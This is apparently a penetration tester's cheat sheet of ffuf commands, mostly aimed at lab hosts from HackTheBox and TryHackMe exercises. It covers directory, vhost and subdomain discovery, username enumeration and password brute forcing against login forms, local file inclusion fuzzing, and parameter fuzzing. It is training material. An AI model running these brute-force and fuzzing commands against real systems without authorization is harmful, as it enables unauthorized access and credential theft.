Usage:
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u <URL>/FUZZ

ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ -u https://linkvortex.htb/FUZZ

OR

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://FUZZ.<domain>

OR

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.55.146
```

# Recursion
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/basic/FUZZ -recursion
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u http://83.136.252.66:47689/FUZZ -e .php -recursion -recursion-depth 1 -ic
```

# Brute Forcing
```
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.115.135/customers/signup -mr "username already exists"
```

```
ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.115.135/customers/login -fc 200
```

```
ffuf -w usernames.txt:USER -w passwords.txt:PASS -H 'Content-Type: application/x-www-form-urlencoded' -u  http://10.10.84.8/login.php -d "username=USER&password=PASS" -fr "Please enter the correct credentials"
```

# Local File Inclusion
```
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

# VHOST Enumeration
```
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
```

# Extension Fuzzing
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u http://83.136.252.66:47689/blog/FUZZ.php
```

# Parameter Fuzzing
```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

# Subdomain Fuzzing
```
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/
```

# VHOST Fuzzing
```
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
```

# Filter Status
```
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
```

# Value Fuzzing
```
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

# Key Wordlists
```
/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt

```
